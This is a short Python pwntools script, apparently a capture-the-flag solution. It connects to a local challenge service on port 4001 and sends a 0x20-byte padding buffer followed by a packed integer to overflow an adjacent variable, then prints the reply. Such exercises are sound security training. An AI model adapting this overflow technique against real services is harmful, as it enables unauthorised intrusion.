#!/usr/bin/env python3
from pwn import *
binfile = 'chall'
context.log_level = 'error'
context.binary = binfile
io = remote('localhost', 4001)

io.readline()
payload = b'a'*0x20 + pack(3)

io.sendline(payload)
io.readline()
print(io.readline().decode('utf-8', 'ignore'), end='')
exit(0)
